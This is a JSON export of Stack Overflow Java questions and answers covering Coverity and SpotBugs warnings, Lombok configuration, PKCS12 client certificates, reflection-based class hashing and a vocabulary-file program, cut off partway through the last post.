{"items":[{"tags":["java","jackson","objectmapper","coverity","ldjson"],"comments":[{"owner":{"account_id":1010971,"reputation":11524,"user_id":1023553,"accept_rate":59,"display_name":"NoDataFound"},"score":0,"creation_date":1639524670,"post_id":70356742,"comment_id":124369673,"body_markdown":"Are you sure the Coverity problem you mention is about using a JSON String to parse content ? Other alternative would probably use a byte[] representation rather than a String and the problem would be still there: you parse a JSON from a foreign source.","body":"Are you sure the Coverity problem you mention is about using a JSON String to parse content ? Other alternative would probably use a byte[] representation rather than a String and the problem would be still there: you parse a JSON from a foreign source."},{"owner":{"account_id":3144597,"reputation":9476,"user_id":2659307,"display_name":"Scott McPeak"},"score":0,"creation_date":1639538608,"post_id":70356742,"comment_id":124372098,"body_markdown":"It would be helpful to see the exact Coverity error message.","body":"It would be helpful to see the exact Coverity error message."},{"owner":{"account_id":8469539,"reputation":39,"user_id":6352663,"display_name":"For Serious"},"score":0,"creation_date":1639581471,"post_id":70356742,"comment_id":124386136,"body_markdown":"Sure. I added it to the end.","body":"Sure. I added it to the end."}],"owner":{"account_id":8469539,"reputation":39,"user_id":6352663,"display_name":"For Serious"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":477,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":0,"score":1,"last_activity_date":1639587169,"creation_date":1639524422,"question_id":70356742,"body_markdown":"I am using RestTemplate.exchange to get data from a URI. I have no control over how the JSON is returned, and for unknown reasons it happens to be line-delimited JSON (also called JSON Lines, dljson, JSONL):\r\n```\r\n{}\\n\r\n{}\\n\r\n{}\r\n```\r\nThis is using Spring Boot version 2.1.6. Updating might become an option, but not soon.\r\nI have a method that parses it very nicely into a list of objects:\r\n```\r\nString dataFile = response.getData().getDataFile();\r\n    RestTemplate restTemplate = new RestTemplate();\r\n\r\n    MappingJackson2HttpMessageConverter mappingJackson2HttpMessageConverter = new MappingJackson2HttpMessageConverter();\r\n    mappingJackson2HttpMessageConverter.setSupportedMediaTypes(Arrays.asList(MediaType.APPLICATION_JSON, MediaType.APPLICATION_OCTET_STREAM));\r\n    restTemplate.getMessageConverters().add(mappingJackson2HttpMessageConverter);\r\n    ResponseEntity&lt;String&gt; responseEntity = restTemplate.exchange(new URI(dataFile), HttpMethod.GET, new HttpEntity&lt;&gt;(new HttpHeaders()), String.class);\r\n\r\n    ObjectMapper mapper = new ObjectMapper();\r\n    mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, true);\r\n    MappingIterator&lt;TheDataObject&gt; jrParser = mapper.readerFor(TheDataObject.class).readValues(responseEntity.getBody());\r\n    ArrayList&lt;TheDataObject&gt; theList = new ArrayList&lt;&gt;();\r\n    while(jrParser.hasNextValue()) {\r\n        theList.add(jrParser.nextValue());\r\n    }\r\n    return theList;\r\n```\r\nI would leave it at this, but Coverity condemns the use of the String class in `ResponseEntity&lt;String&gt;`, stating that trusting such a string, allows for an attack vector.\r\n\r\nHow do I set the ObjectMapper to do what it&#39;s doing before the exchange call?\r\n\r\n**Addition:**\r\nHere&#39;s everything Coverity says about it:\r\n1. tainted_source: org.springframework.http.HttpEntity.getBody() returns data from a network socket.\r\n\r\nCID #: Unsafe deserialization (UNSAFE_DESERIALIZATION)2. sink: A tainted value (java.lang.String)responseEntity.getBody() is deserialized. This may allow an attacker to bypass security checks or execute arbitrary code.\r\n\r\n  If possible, use pure data formats such as JSON or XML to serialize and deserialize untrusted data. Otherwise, if you must use native serialization methods, check the integrity of the data (for example with HMAC) before deserializing it.","title":"How to parse line-delimited JSON without using String class?","body":"<p>I am using RestTemplate.exchange to get data from a URI. I have no control over how the JSON is returned, and for unknown reasons it happens to be line-delimited JSON (also called JSON Lines, dljson, JSONL):</p>\n<pre><code>{}\\n\n{}\\n\n{}\n</code></pre>\n<p>This is using Spring Boot version 2.1.6. Updating might become an option, but not soon.\nI have a method that parses it very nicely into a list of objects:</p>\n<pre><code>String dataFile = response.getData().getDataFile();\n    RestTemplate restTemplate = new RestTemplate();\n\n    MappingJackson2HttpMessageConverter mappingJackson2HttpMessageConverter = new MappingJackson2HttpMessageConverter();\n    mappingJackson2HttpMessageConverter.setSupportedMediaTypes(Arrays.asList(MediaType.APPLICATION_JSON, MediaType.APPLICATION_OCTET_STREAM));\n    restTemplate.getMessageConverters().add(mappingJackson2HttpMessageConverter);\n    ResponseEntity&lt;String&gt; responseEntity = restTemplate.exchange(new URI(dataFile), HttpMethod.GET, new HttpEntity&lt;&gt;(new HttpHeaders()), String.class);\n\n    ObjectMapper mapper = new ObjectMapper();\n    mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, true);\n    MappingIterator&lt;TheDataObject&gt; jrParser = mapper.readerFor(TheDataObject.class).readValues(responseEntity.getBody());\n    ArrayList&lt;TheDataObject&gt; theList = new ArrayList&lt;&gt;();\n    while(jrParser.hasNextValue()) {\n        theList.add(jrParser.nextValue());\n    }\n    return theList;\n</code></pre>\n<p>I would leave it at this, but Coverity condemns the use of the String class in <code>ResponseEntity&lt;String&gt;</code>, stating that trusting such a string, allows for an attack vector.</p>\n<p>How do I set the ObjectMapper to do what it's doing before the exchange call?</p>\n<p><strong>Addition:</strong>\nHere's everything Coverity says about it:</p>\n<ol>\n<li>tainted_source: org.springframework.http.HttpEntity.getBody() returns data from a network socket.</li>\n</ol>\n<p>CID #: Unsafe deserialization (UNSAFE_DESERIALIZATION)2. sink: A tainted value (java.lang.String)responseEntity.getBody() is deserialized. This may allow an attacker to bypass security checks or execute arbitrary code.</p>\n<p>If possible, use pure data formats such as JSON or XML to serialize and deserialize untrusted data. Otherwise, if you must use native serialization methods, check the integrity of the data (for example with HMAC) before deserializing it.</p>\n"},{"tags":["java","lombok"],"comments":[{"owner":{"account_id":1637870,"reputation":553,"user_id":1510874,"display_name":"asbachb"},"score":1,"creation_date":1625814135,"post_id":68311821,"comment_id":120732427,"body_markdown":"Does this answer your question? [FindBugs raises a bug called EI\\_EXPOSE\\_REP caused by Array](https://stackoverflow.com/questions/47298842/findbugs-raises-a-bug-called-ei-expose-rep-caused-by-array)","body":"Does this answer your question? <a href=\"https://stackoverflow.com/questions/47298842/findbugs-raises-a-bug-called-ei-expose-rep-caused-by-array\">FindBugs raises a bug called EI_EXPOSE_REP caused by Array</a>"},{"owner":{"account_id":27641,"reputation":9774,"user_id":73137,"accept_rate":89,"display_name":"SyncMaster"},"score":1,"creation_date":1625815258,"post_id":68311821,"comment_id":120732834,"body_markdown":"Thanks for your comment! However it doesn&#39;t solve my issue as I am relying on Lombok for @Builder, Getter and Setter. So I am trying to find if this is even possible with Lombok to use an array?","body":"Thanks for your comment! However it doesn&#39;t solve my issue as I am relying on Lombok for @Builder, Getter and Setter. So I am trying to find if this is even possible with Lombok to use an array?"},{"owner":{"account_id":1637870,"reputation":553,"user_id":1510874,"display_name":"asbachb"},"score":1,"creation_date":1625816716,"post_id":68311821,"comment_id":120733279,"body_markdown":"Afaik there&#39;s no possibility in lombok to configure to generate immutable arrays. You might try to implement the `getter` for that field on your own by using `Arrays.copyOf`. But I&#39;m unsure this will help.","body":"Afaik there&#39;s no possibility in lombok to configure to generate immutable arrays. You might try to implement the <code>getter</code> for that field on your own by using <code>Arrays.copyOf</code>. But I&#39;m unsure this will help."},{"owner":{"account_id":1056871,"reputation":117729,"user_id":1059372,"accept_rate":97,"display_name":"Eugene"},"score":2,"creation_date":1625882691,"post_id":68311821,"comment_id":120752602,"body_markdown":"just write it by hand.","body":"just write it by hand."}],"answers":[{"tags":[],"owner":{"account_id":1056956,"reputation":5781,"user_id":1059446,"accept_rate":89,"display_name":"Aleksandr Kravets"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1637155496,"creation_date":1637155496,"answer_id":70005220,"question_id":68311821,"body_markdown":"It&#39;s an old and well known problem with methods generated by Lombok that return or accept mutable objects or structures.\r\nFor example [this issue about Date][1] was submitted in 2015.  \r\nIt is unlikely that Lombok will ever fix this because it&#39;s non-trivial.\r\nYour options :\r\n\r\n 1. Disable particular FindBugs/SpotBugs inspection via build tool plugin or IDE configuration.\r\n 2. Place @SuppressFBWarnings with relevant error code on violating class.\r\n 3. Use `onX` Lombok feature to let it place @SuppressFBWarnings on violating methods(setters,getters etc.) like in snippet below.\r\n\r\n``` java\r\n@Data\r\n@Setter(onMethod_ = @SuppressFBWarnings({&quot;EI_EXPOSE_REP2&quot;,&quot;EI_EXPOSE_REP&quot;}))\r\n@Getter(onMethod_ = @SuppressFBWarnings({&quot;EI_EXPOSE_REP2&quot;,&quot;EI_EXPOSE_REP&quot;}))\r\npublic class TheClass {\r\n    private MutableClassOrStructure classOrStructure;\r\n}\r\n```\r\n\r\n  [1]: https://github.com/projectlombok/lombok/issues/420","title":"Lombok annotations give Malicious code error - May expose internal representation by returning reference to mutable object error","body":"<p>It's an old and well known problem with methods generated by Lombok that return or accept mutable objects or structures.\nFor example <a href=\"https://github.com/projectlombok/lombok/issues/420\" rel=\"nofollow noreferrer\">this issue about Date</a> was submitted in 2015.<br />\nIt is unlikely that Lombok will ever fix this because it's non-trivial.\nYour options :</p>\n<ol>\n<li>Disable particular FindBugs/SpotBugs inspection via build tool plugin or IDE configuration.</li>\n<li>Place @SuppressFBWarnings with relevant error code on violating class.</li>\n<li>Use <code>onX</code> Lombok feature to let it place @SuppressFBWarnings on violating methods(setters,getters etc.) like in snippet below.</li>\n</ol>\n<pre class=\"lang-java prettyprint-override\"><code>@Data\n@Setter(onMethod_ = @SuppressFBWarnings({&quot;EI_EXPOSE_REP2&quot;,&quot;EI_EXPOSE_REP&quot;}))\n@Getter(onMethod_ = @SuppressFBWarnings({&quot;EI_EXPOSE_REP2&quot;,&quot;EI_EXPOSE_REP&quot;}))\npublic class TheClass {\n    private MutableClassOrStructure classOrStructure;\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":1336332,"reputation":3448,"user_id":1279002,"accept_rate":44,"display_name":"theINtoy"},"down_vote_count":0,"up_vote_count":8,"is_accepted":false,"score":8,"last_activity_date":1639587107,"creation_date":1639587107,"answer_id":70367409,"question_id":68311821,"body_markdown":"One way to solve this is to add some lombok config. The way to do this is in the root of the project (the same place your pom.xml/build.gradle is) add a file called:\r\n\r\n `lombok.config`. \r\n\r\nIn this file add the following lines:\r\n\r\n```\r\nconfig.stopBubbling = true\r\nlombok.addLombokGeneratedAnnotation = true\r\nlombok.extern.findbugs.addSuppressFBWarnings = true\r\nlombok.anyConstructor.addConstructorProperties = true\r\n```\r\n\r\n\r\nMore info here:\r\nhttps://projectlombok.org/features/configuration\r\n","title":"Lombok annotations give Malicious code error - May expose internal representation by returning reference to mutable object error","body":"<p>One way to solve this is to add some lombok config. The way to do this is in the root of the project (the same place your pom.xml/build.gradle is) add a file called:</p>\n<p><code>lombok.config</code>.</p>\n<p>In this file add the following lines:</p>\n<pre><code>config.stopBubbling = true\nlombok.addLombokGeneratedAnnotation = true\nlombok.extern.findbugs.addSuppressFBWarnings = true\nlombok.anyConstructor.addConstructorProperties = true\n</code></pre>\n<p>More info here:\n<a href=\"https://projectlombok.org/features/configuration\" rel=\"noreferrer\">https://projectlombok.org/features/configuration</a></p>\n"}],"owner":{"account_id":27641,"reputation":9774,"user_id":73137,"accept_rate":89,"display_name":"SyncMaster"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":13990,"favorite_count":0,"down_vote_count":0,"up_vote_count":8,"answer_count":2,"score":8,"last_activity_date":1639587107,"creation_date":1625809408,"question_id":68311821,"body_markdown":"I have the following class.\r\n\r\n    // Adding Lombok&#39;s @Data / @Value gives an error\r\n    public class Sample {\r\n    \r\n        String id;\r\n    \r\n        String name;\r\n    \r\n        Dummy[] entries;\r\n    \r\n        @JsonCreator\r\n        // @Builder --&gt; This gives same error\r\n        private Sample(\r\n                @JsonProperty(&quot;id&quot;) final String id,\r\n                @JsonProperty(&quot;name&quot;) final String name,\r\n                @JsonProperty(&quot;entries&quot;) @NonNull final Dummy[] entries) {\r\n            this.id = id;\r\n            this.name = name;\r\n            this.entries = entries;\r\n        }\r\n    }\r\n\r\nIf I add Lomobok annotations, I get the following error. We heavily rely on Lombok and I am trying to figure out how I can ensure I don&#39;t return a mutable object. \r\n\r\n    EI_EXPOSE_REP: May expose internal representation by returning reference to mutable object\r\n    \r\n    EI_EXPOSE_REP2: May expose internal representation by incorporating reference to mutable object\r\n\r\nAs an alternative, I could use List instead of Array and rely on @Singular annotation. But I would like to know if there is a workaround for Array with Lombok&#39;s annoations.","title":"Lombok annotations give Malicious code error - May expose internal representation by returning reference to mutable object error","body":"<p>I have the following class.</p>\n<pre><code>// Adding Lombok's @Data / @Value gives an error\npublic class Sample {\n\n    String id;\n\n    String name;\n\n    Dummy[] entries;\n\n    @JsonCreator\n    // @Builder --&gt; This gives same error\n    private Sample(\n            @JsonProperty(&quot;id&quot;) final String id,\n            @JsonProperty(&quot;name&quot;) final String name,\n            @JsonProperty(&quot;entries&quot;) @NonNull final Dummy[] entries) {\n        this.id = id;\n        this.name = name;\n        this.entries = entries;\n    }\n}\n</code></pre>\n<p>If I add Lomobok annotations, I get the following error. We heavily rely on Lombok and I am trying to figure out how I can ensure I don't return a mutable object.</p>\n<pre><code>EI_EXPOSE_REP: May expose internal representation by returning reference to mutable object\n\nEI_EXPOSE_REP2: May expose internal representation by incorporating reference to mutable object\n</code></pre>\n<p>As an alternative, I could use List instead of Array and rely on @Singular annotation. But I would like to know if there is a workaround for Array with Lombok's annoations.</p>\n"},{"tags":["java","ssl","keystore","pkcs#12","p12"],"comments":[{"owner":{"account_id":3421244,"reputation":35863,"user_id":2868801,"display_name":"dave_thompson_085"},"score":0,"creation_date":1639601923,"post_id":70367377,"comment_id":124393765,"body_markdown":"You need to use the data in a p12 file or equivalent to do &#39;two-way&#39; TLS (more accurately mutual authentication or client authentication) but that does _not_ send the p12 file. You show nerarly correct code to read the file into a context (you leak the open, which could cause failures later) but you don&#39;t show how and if you use this context, so this is not a reproducible example and it&#39;s impossible to help you.","body":"You need to use the data in a p12 file or equivalent to do &#39;two-way&#39; TLS (more accurately mutual authentication or client authentication) but that does <i>not</i> send the p12 file. You show nerarly correct code to read the file into a context (you leak the open, which could cause failures later) but you don&#39;t show how and if you use this context, so this is not a reproducible example and it&#39;s impossible to help you."},{"owner":{"account_id":10655924,"reputation":59,"user_id":7845479,"display_name":"Ghassen Arfaoui"},"score":0,"creation_date":1644258879,"post_id":70367377,"comment_id":125552898,"body_markdown":"did u figure it out  i keep getting 500 error while its working fine with curl or postman","body":"did u figure it out  i keep getting 500 error while its working fine with curl or postman"}],"owner":{"account_id":23657158,"reputation":1,"user_id":17685244,"display_name":"venkatasurya giddaluru"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":590,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1639587058,"creation_date":1639586974,"question_id":70367377,"body_markdown":"I need to send .p12 file to communicate client-server to send the post request JSON and get the response. I am pretty new to these cert  p12 files authentication. Through postman using the p12 file am able to get the response. Now I am trying through the application\r\n\r\n    KeyStore keyStore = KeyStore.getInstance(&quot;PKCS12&quot;);\r\n                keyStore.load(new FileInputStream(&quot;/path/newKeyStoreFileName.jks&quot;), keystorepwd.toCharArray());\r\n                KeyManagerFactory kmf = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());\r\n                kmf.init(keyStore, keystorepwd.toCharArray());\r\n                KeyManager[] kms = kmf.getKeyManagers();\r\n                SSLContext  sslContext = SSLContext.getInstance(&quot;TLS&quot;);\r\n                sslContext.init(kms, null, new SecureRandom());\r\n\r\n","title":"How to send given p12 file in post request using java.net.HttpURLConnection (Two way Handshake p12 cert file)","body":"<p>I need to send .p12 file to communicate client-server to send the post request JSON and get the response. I am pretty new to these cert  p12 files authentication. Through postman using the p12 file am able to get the response. Now I am trying through the application</p>\n<pre><code>KeyStore keyStore = KeyStore.getInstance(&quot;PKCS12&quot;);\n            keyStore.load(new FileInputStream(&quot;/path/newKeyStoreFileName.jks&quot;), keystorepwd.toCharArray());\n            KeyManagerFactory kmf = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());\n            kmf.init(keyStore, keystorepwd.toCharArray());\n            KeyManager[] kms = kmf.getKeyManagers();\n            SSLContext  sslContext = SSLContext.getInstance(&quot;TLS&quot;);\n            sslContext.init(kms, null, new SecureRandom());\n</code></pre>\n"},{"tags":["java","reflection"],"comments":[{"owner":{"account_id":3211603,"reputation":289297,"user_id":2711488,"display_name":"Holger"},"score":2,"creation_date":1639589856,"post_id":70366817,"comment_id":124389565,"body_markdown":"Looks like you’re reinventing the serialVersionUID. When your class implements `Serializable`, you can simply use [`ObjectStreamClass.lookup(A.class)`](https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/io/ObjectStreamClass.html#lookup(java.lang.Class))[`.getSerialVersionUID()`](https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/io/ObjectStreamClass.html#getSerialVersionUID()).","body":"Looks like you’re reinventing the serialVersionUID. When your class implements <code>Serializable</code>, you can simply use <a href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/io/ObjectStreamClass.html#lookup(java.lang.Class)\" rel=\"nofollow noreferrer\"><code>ObjectStreamClass.lookup(A.class)</code></a><a href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/io/ObjectStreamClass.html#getSerialVersionUID()\" rel=\"nofollow noreferrer\"><code>.getSerialVersionUID()</code></a>."}],"answers":[{"tags":[],"owner":{"account_id":80868,"reputation":8448,"user_id":228371,"accept_rate":86,"display_name":"Freiheit"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1639587005,"creation_date":1639584876,"answer_id":70366926,"question_id":70366817,"body_markdown":"https://commons.apache.org/proper/commons-lang/apidocs/org/apache/commons/lang3/reflect/FieldUtils.html#getAllFieldsList-java.lang.Class- sounds like it could be a sufficient solution to your problem.\r\n\r\nAddresssing a comment, `getAllFieldsList` returns `List&lt;Field&gt;` so you should be able to iterate or recurse through that `List` and then call `Field.getType()` which returns `Class`. Now call  `getAllFieldsList` again. This should let you traverse from Class A then get information about Class B.\r\n\r\nAnother idea might be to use the JSON_STYLE and call `https://commons.apache.org/proper/commons-lang/apidocs/org/apache/commons/lang3/builder/ReflectionToStringBuilder.html#ReflectionToStringBuilder-java.lang.Object-org.apache.commons.lang3.builder.ToStringStyle-`. This will recurse and print out JSON representing `A` then you can parse the JSON and check the field names.\r\n\r\nAnother pathway might be to handle this at compile time or package time. Unless you&#39;re using other reflection or aspect oriented programming techniques your classes will only change in development at compile time. Detecting changes as part of your build or CI/CD processes then feeding those into your MongoDB may make more sense.","title":"How to get a hash of a Java class&#39; structure?","body":"<p><a href=\"https://commons.apache.org/proper/commons-lang/apidocs/org/apache/commons/lang3/reflect/FieldUtils.html#getAllFieldsList-java.lang.Class-\" rel=\"nofollow noreferrer\">https://commons.apache.org/proper/commons-lang/apidocs/org/apache/commons/lang3/reflect/FieldUtils.html#getAllFieldsList-java.lang.Class-</a> sounds like it could be a sufficient solution to your problem.</p>\n<p>Addresssing a comment, <code>getAllFieldsList</code> returns <code>List&lt;Field&gt;</code> so you should be able to iterate or recurse through that <code>List</code> and then call <code>Field.getType()</code> which returns <code>Class</code>. Now call  <code>getAllFieldsList</code> again. This should let you traverse from Class A then get information about Class B.</p>\n<p>Another idea might be to use the JSON_STYLE and call <code>https://commons.apache.org/proper/commons-lang/apidocs/org/apache/commons/lang3/builder/ReflectionToStringBuilder.html#ReflectionToStringBuilder-java.lang.Object-org.apache.commons.lang3.builder.ToStringStyle-</code>. This will recurse and print out JSON representing <code>A</code> then you can parse the JSON and check the field names.</p>\n<p>Another pathway might be to handle this at compile time or package time. Unless you're using other reflection or aspect oriented programming techniques your classes will only change in development at compile time. Detecting changes as part of your build or CI/CD processes then feeding those into your MongoDB may make more sense.</p>\n"}],"owner":{"account_id":9541910,"reputation":454,"user_id":7089716,"display_name":"davidbaguetta"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":390,"favorite_count":0,"down_vote_count":0,"up_vote_count":2,"answer_count":1,"score":2,"last_activity_date":1639587005,"creation_date":1639584367,"question_id":70366817,"body_markdown":"Imagine I have the following two classes:\r\n\r\n```java\r\npublic class A {\r\n    private String field1;\r\n    private B field2;\r\n}\r\n\r\npublic class B {\r\n    private String field3;\r\n}\r\n```\r\n\r\nWhat I want to do is use Java Reflection to get all the fields and all the subfields from class A and create a hash out of it. In this example, I would get, say, a list of Strings saying `[&quot;field1&quot;, &quot;field2&quot;, &quot;field3&quot;]`, and I would hash the entire list.\r\n\r\nIn case it helps, the reason I am doing this is because I have a MongoDB collection for `A`. However, every once in a while, I add new fields to `A` or `B`, and I need to refresh the entire collection with the new fields when that happens. For this, I need to keep track, in a separate collection, of whether I have already refreshed `A`&#39;s collection yet or not for its current structure. The easiest way would be to just hash its fields and subfields names.","title":"How to get a hash of a Java class&#39; structure?","body":"<p>Imagine I have the following two classes:</p>\n<pre class=\"lang-java prettyprint-override\"><code>public class A {\n    private String field1;\n    private B field2;\n}\n\npublic class B {\n    private String field3;\n}\n</code></pre>\n<p>What I want to do is use Java Reflection to get all the fields and all the subfields from class A and create a hash out of it. In this example, I would get, say, a list of Strings saying <code>[&quot;field1&quot;, &quot;field2&quot;, &quot;field3&quot;]</code>, and I would hash the entire list.</p>\n<p>In case it helps, the reason I am doing this is because I have a MongoDB collection for <code>A</code>. However, every once in a while, I add new fields to <code>A</code> or <code>B</code>, and I need to refresh the entire collection with the new fields when that happens. For this, I need to keep track, in a separate collection, of whether I have already refreshed <code>A</code>'s collection yet or not for its current structure. The easiest way would be to just hash its fields and subfields names.</p>\n"},{"tags":["java","txt"],"comments":[{"owner":{"account_id":2360785,"reputation":11123,"user_id":2067492,"display_name":"matt"},"score":0,"creation_date":1639586112,"post_id":70367154,"comment_id":124388069,"body_markdown":"What happens when you run your current code.","body":"What happens when you run your current code."},{"owner":{"account_id":23429465,"reputation":1,"user_id":17488524,"display_name":"Linus Huck"},"score":0,"creation_date":1639586220,"post_id":70367154,"comment_id":124388108,"body_markdown":"the vocab is added but the next time i read in the file the programm doesnt read in the new vocab","body":"the vocab is added but the next time i read in the file the programm doesnt read in the new vocab"},{"owner":{"account_id":3430916,"reputation":3799,"user_id":3059385,"accept_rate":40,"display_name":"Christopher Schneider"},"score":0,"creation_date":1639586302,"post_id":70367154,"comment_id":124388141,"body_markdown":"What is &quot;the number&quot;? What number? You need to add more details. Like, what does this file look like before and after you run the program? Add your comment as details to the question as well as be more specific about the problem.","body":"What is &quot;the number&quot;? What number? You need to add more details. Like, what does this file look like before and after you run the program? Add your comment as details to the question as well as be more specific about the problem."},{"owner":{"account_id":2360785,"reputation":11123,"user_id":2067492,"display_name":"matt"},"score":1,"creation_date":1639586335,"post_id":70367154,"comment_id":124388149,"body_markdown":"So the file changes? You only read the file once, so I don&#39;t see how the program would read the new vocab.","body":"So the file changes? You only read the file once, so I don&#39;t see how the program would read the new vocab."},{"owner":{"account_id":23429465,"reputation":1,"user_id":17488524,"display_name":"Linus Huck"},"score":0,"creation_date":1639586595,"post_id":70367154,"comment_id":124388258,"body_markdown":"The adding is not happening so far, only the storage of the vocabularies","body":"The adding is not happening so far, only the storage of the vocabularies"},{"owner":{"account_id":-1,"reputation":1,"user_id":-1,"display_name":"Community"},"score":0,"creation_date":1640163536,"post_id":70367154,"comment_id":124528035,"body_markdown":"Please edit the question to limit it to a specific problem with enough detail to identify an adequate answer.","body":"Please edit the question to limit it to a specific problem with enough detail to identify an adequate answer."}],"answers":[{"tags":[],"owner":{"account_id":204659,"reputation":37539,"user_id":453005,"accept_rate":100,"display_name":"DwB"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639586807,"creation_date":1639586571,"answer_id":70367289,"question_id":70367154,"body_markdown":"***Not an answer to your question;\r\na design suggestion instead.***\r\n\r\nIt appears that you have a file in which you store *things*\r\n(perhaps Vokablin)\r\nand each *thing* in the file is structured the same,\r\nbut contains different details.\r\n\r\nDo not store the count in the file.\r\nInstead,\r\nJust store *things* in the file and read them all.\r\n\r\nIf you must,\r\nadd a marker at the end of the file that indicates &quot;end of stuff&quot;.\r\nFor, reasons, you might want to store a count of *things* in the file.\r\nIf that is the case,\r\nstore the count as part of the end-of-file marker.\r\n\r\nIf you use this technique,\r\nyour add-to-the-file algorithm becomes this:\r\n\r\n 1. Read a line.\r\n 1. Is the line a *thing*?\r\n 1. if yes, write it,\r\n 1. if no, parse the end-of-file marker, increment the count, and write the end-of-file marker.","title":"How to replace the first line of a txt document","body":"<p><em><strong>Not an answer to your question;\na design suggestion instead.</strong></em></p>\n<p>It appears that you have a file in which you store <em>things</em>\n(perhaps Vokablin)\nand each <em>thing</em> in the file is structured the same,\nbut contains different details.</p>\n<p>Do not store the count in the file.\nInstead,\nJust store <em>things</em> in the file and read them all.</p>\n<p>If you must,\nadd a marker at the end of the file that indicates &quot;end of stuff&quot;.\nFor, reasons, you might want to store a count of <em>things</em> in the file.\nIf that is the case,\nstore the count as part of the end-of-file marker.</p>\n<p>If you use this technique,\nyour add-to-the-file algorithm becomes this:</p>\n<ol>\n<li>Read a line.</li>\n<li>Is the line a <em>thing</em>?</li>\n<li>if yes, write it,</li>\n<li>if no, parse the end-of-file marker, increment the count, and write the end-of-file marker.</li>\n</ol>\n"}],"owner":{"account_id":23429465,"reputation":1,"user_id":17488524,"display_name":"Linus Huck"},"comment_count":6,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":47,"favorite_count":0,"down_vote_count":3,"up_vote_count":0,"answer_count":1,"score":-3,"last_activity_date":1639586807,"creation_date":1639585932,"question_id":70367154,"body_markdown":"I would like to replace the first line of the document Vokabeln.txt, where the number of vocabularies is stored, so that when a vocabulary is added, the number is increased by one.\r\nThanks for helping me.\r\n\r\n\r\n```import java.util.*;\r\nimport java.io.*;\r\npublic class Vokabeltrainer\r\n{\r\n    private String file;\r\n    private String line;\r\n    private int anzahlVokabeln;\r\n    private boolean status = true;\r\n    Scanner sc = new Scanner(System.in);\r\n    private ArrayList &lt;Vokabel&gt; Vokabelliste;\r\n    public Vokabeltrainer()\r\n    {\r\n        this.file = &quot;&quot;;\r\n        this.Vokabelliste = new ArrayList&lt;Vokabel&gt;();\r\n    }\r\n\r\n    public void main() throws IOException\r\n    {\r\n        System.out.println(&quot;Vokabeln.txt&quot;);\r\n        this.file = (&quot;Vokabeln.txt&quot;);\r\n        try (BufferedReader br = new BufferedReader(new FileReader(file)))\r\n        {\r\n            line = br.readLine();\r\n            anzahlVokabeln = Integer.parseInt(line);\r\n            for(int i = 0;i &lt; anzahlVokabeln; i++)\r\n            {\r\n                line = br.readLine();\r\n                this.Vokabelliste.add(new Vokabel(line.split(&quot;\\\\s+&quot;)[0],line.split(&quot;\\\\s+&quot;)[1]));\r\n            }\r\n        }\r\n        while(status==true)\r\n        {\r\n            System.out.println(&quot;Was willst du machen \\n-Vokabel hinzuf&#252;gen\\n-Vokabel enfernen\\n-Vokabeln Abfragen\\n-Programm Quit&quot;);\r\n            String line = sc.nextLine();\r\n            if(line.equals(&quot;one&quot;)||line.equals(&quot;Add vocabulary&quot;))\r\n            {\r\n                Vokabelhinzuf&#252;gen();\r\n            }\r\n            else if(line.equals(&quot;two&quot;)||line.equals(&quot;Remove vocabulary&quot;))\r\n            {\r\n\r\n            }\r\n            else if(line.equals(&quot;three&quot;)||line.equals(&quot;Vokabeln Abfragen&quot;))\r\n            {\r\n\r\n            }\r\n            else if(line.equals(&quot;four&quot;)||line.equals(&quot;Quit&quot;))\r\n            {\r\n                status = false;\r\n                //Maybe Statistics from the User\r\n            }\r\n            else\r\n            {\r\n                System.out.println(&quot;This option doesnt exists.&quot;);\r\n            }\r\n        }\r\n    }\r\n\r\n    public void Vokabelhinzuf&#252;gen()\r\n    {\r\n        boolean vokabelhinzustatus = true;\r\n        String Vokabel = &quot;&quot;;\r\n        while(vokabelhinzustatus==true)\r\n        {\r\n            System.out.println(&quot;Please enter the vocabulary now. (Hallo Hello)&quot;);\r\n            Vokabel = sc.nextLine();\r\n            try(PrintWriter output = new PrintWriter(new FileWriter(&quot;Vokabeln.txt&quot;,true))) \r\n            {\r\n                output.printf(&quot;%s\\r\\n&quot;, Vokabel.toLowerCase());\r\n                String after = String.valueOf(anzahlVokabeln+1);\r\n                String before = String.valueOf(anzahlVokabeln);\r\n//At this point the replace has to be. before is the number before the translation was added and after is after the translation was added.\r\n            } \r\n\r\n            catch (Exception e) {}            \r\n            System.out.println(&quot;Vocabulary Successfully Added&quot;);\r\n            System.out.println(&quot;Exit Add Vocabulary?&quot;);\r\n            String line = sc.nextLine();\r\n            if(line.equals(&quot;yes&quot;))\r\n            {\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\n    public void Vokabelentfernen()\r\n    {\r\n\r\n    }\r\n}\r\n","title":"How to replace the first line of a txt document","body":"<p>I would like to replace the first line of the document Vokabeln.txt, where the number of vocabularies is stored, so that when a vocabulary is added, the number is increased by one.\nThanks for helping me.</p>\n<pre><code>import java.io.*;\npublic class Vokabeltrainer\n{\n    private String file;\n    private String line;\n    private int anzahlVokabeln;\n    private boolean status = true;\n    Scanner sc = new Scanner(System.in);\n    private ArrayList &lt;Vokabel&gt; Vokabelliste;\n    public Vokabeltrainer()\n    {\n        this.file = &quot;&quot;;\n        this.Vokabelliste = new 